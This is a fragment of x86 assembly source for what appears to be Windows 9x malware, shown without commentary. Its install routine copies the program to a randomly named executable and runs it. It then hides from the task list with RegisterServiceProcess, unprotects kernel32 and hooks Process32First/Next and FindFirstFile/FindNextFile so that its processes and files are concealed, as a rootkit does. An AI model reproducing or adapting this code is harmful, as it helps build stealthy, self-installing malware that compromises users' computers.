install:
       push byte 3
       call dword [SetErrorMode]
       push ebp
       push ebp
       push ebp
       push ebp
       push ebp
       call dword [PeekMessageA]
       mov ebx, 104h
       sub esp, ebx
       mov esi, esp
       sub esp, ebx
       mov edi, esp
       mov eax, [forward_chain+run_RVA]
       mov ebx, [eax+3ch]
       lea eax, [eax+ebx-4]
       cmp dword [eax], byte -1
       mov [peheader], eax
       push esp
       push esp
       push byte 1
       push ebp
       push dword regentry
       push dword 80000002h
       je .exit2win2
       call dword [RegOpenKeyExA]
       test eax, eax
       push ebx
       push esp
       push esi
       push ebp
       push ebp
       push dword regkey
       push dword [esp+6*4]
       je .skip_exit2win
  .exit2win2:
       jmp_ .exit2win
  .skip_exit2win:
       call dword [RegQueryValueExA]
       push dword [esp+1*4]
       call dword [RegCloseKey]
       push ebx
       push edi
       push ebp
       call dword [GetModuleFileNameA]
       pop ecx
       pop ebx
       mov ebx, esi
       mov [esp+ecx-1], ebp
  .cmpname:
       lodsb
       mov ah, [edi]
       inc edi
       or ax, 2020h
       sub al, ah
       jnz .namedone
       loop .cmpname
  .namedone:
       jecxz .installed
       push byte 8
       lea edi, [esi+ecx-2]
       mov al, "\"
       stosb
       call dword [GetTickCount]
       pop ecx
  .nameloop:
       and al, 0111b
       sub al, -"0"
       stosb
       rol eax, cl
       sub eax, esp
       loop .nameloop
       mov eax, ".EXE"
       stosd
       mov eax, ebp
       stosd
       mov eax, esp
       push ebp
       push ebx
       push eax
       call dword [CopyFileA]
       push ebp
       push ebx
       call dword [WinExec]
  .exit2win:
       push ebp
       call dword [ExitProcess]

  .installed:
       push dword 104h
       push ebx
       push ebp
       call dword [GetModuleFileNameA]
       mov ecx, [ebx+eax-8-4]
       mov [check_name.name1+run_RVA], ecx
       mov ecx, [ebx+eax-4-4]
       mov [check_name.name2+run_RVA], ecx
       add esp, 104h*2
       push byte 1
       push ebp
       call dword [RegisterServiceProcess]
       mov edi, [peheader]
       mov ebx, [forward_chain+run_RVA]
       mov esi, [edi+78h+4]
       mov esi, [esi+ebx+1ch]
       mov ecx, [esi+ebx]
       add ecx, ebx
       mov [vxdcall0], ecx
       push edi
       call deprotect
       mov dword [edi], -1
       mov esi, Process32First
       lodsd
       mov [p32f+run_RVA], eax
       lodsd
       mov [p32n+run_RVA], eax
       lodsd
       mov [fff+run_RVA], eax
       lodsd
       mov [fnf+run_RVA], eax
       movzx ecx, word [edi+4+6]
       lea esi, [edi+4+0f8h]
       mov edx, implant_size+32
  .section_loop:
       mov eax, [esi+36]
       and eax, 0C0000040h
       cmp eax, 0C0000040h
       jne .next_section
       mov eax, [esi+16]
       mov edi, [esi+8]
       sub eax, edi
       cmp eax, edx
       jb .next_section
       add [esi+8], edx
       add edi, [esi+12]
       add edi, ebx
       jmp_ .copy_code
  .next_section:
       add esi, byte 40
       loop .section_loop
       jmp .exit2win

  .copy_code:
       lea ecx, [edx-32]
       mov edx, edi
       mov esi, fff_entry+run_RVA
       cld
       rep movsb
       mov edi, [fff+run_RVA]
       lea esi, [edx+(fff_code-fff_entry)]
       call patch
       mov edi, [fnf+run_RVA]
       lea esi, [edx+(fnf_code-fff_entry)]
       call patch
       add dword [edi-4], byte (fnf_entry-fff_entry)
       mov edi, [p32f+run_RVA]
       lea esi, [edx+(p32f_code-fff_entry)]
       call patch
       add dword [edi-4], byte (p32f_entry-fff_entry)
       mov edi, [p32n+run_RVA]
       lea esi, [edx+(p32n_code-fff_entry)]
       call patch
       add dword [edi-4], (p32n_entry-fff_entry)
       ret

%include "implant.inc"
